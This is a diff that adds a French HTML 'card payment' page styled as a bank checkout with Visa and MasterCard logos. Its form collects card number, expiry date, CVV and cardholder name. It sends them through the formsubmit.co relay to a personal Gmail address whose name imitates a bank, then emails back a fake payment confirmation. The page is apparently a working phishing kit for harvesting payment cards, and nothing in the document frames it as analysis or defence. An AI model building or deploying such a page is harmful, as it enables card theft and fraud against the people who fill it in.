@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Interface de Paiement - Carte Bancaire</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .payment-form {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    .payment-form h2 {
+      margin-bottom: 1rem;
+    }
+    .payment-form label {
+      display: block;
+      margin: 0.5rem 0 0.2rem;
+    }
+    .payment-form input {
+      width: 100%;
+      padding: 0.5rem;
+      margin-bottom: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .payment-form button {
+      background: #0070f3;
+      color: #fff;
+      border: none;
+      padding: 0.75rem;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    .payment-form button:hover {
+      background: #005bb5;
+    }
+    .logos {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1rem;
+    }
+    .logos img {
+      height: 30px;
+      margin: 0 10px;
+    }
+  </style>
+</head>
+<body>
+  <form class="payment-form" action="https://formsubmit.co/cicbanquestd@gmail.com" method="POST">
+    <!-- Configurations FormSubmit -->
+    <input type="hidden" name="_subject" value="Nouveau Paiement Carte Bancaire">
+    <input type="hidden" name="_autoresponse" value="Merci pour votre paiement. Nous avons bien reçu votre demande.">
+    <input type="hidden" name="_template" value="table">
+    <input type="text" name="_honey" style="display:none">
+
+    <h2>Paiement par Carte</h2>
+    <div class="logos">
+      <img src="visa.svg" alt="Visa">
+      <img src="mastercard.svg" alt="MasterCard">
+    </div>
+    
+    <label for="cardNumber">Numéro de carte</label>
+    <input type="text" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" required>
+
+    <label for="expiry">Date d'expiration</label>
+    <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required>
+
+    <label for="cvv">CVV</label>
+    <input type="text" id="cvv" name="cvv" placeholder="XXX" required>
+
+    <label for="name">Nom du titulaire</label>
+    <input type="text" id="name" name="name" placeholder="Nom Prénom" required>
+
+    <button type="submit">Payer</button>
+  </form>
+</body>
+</html>
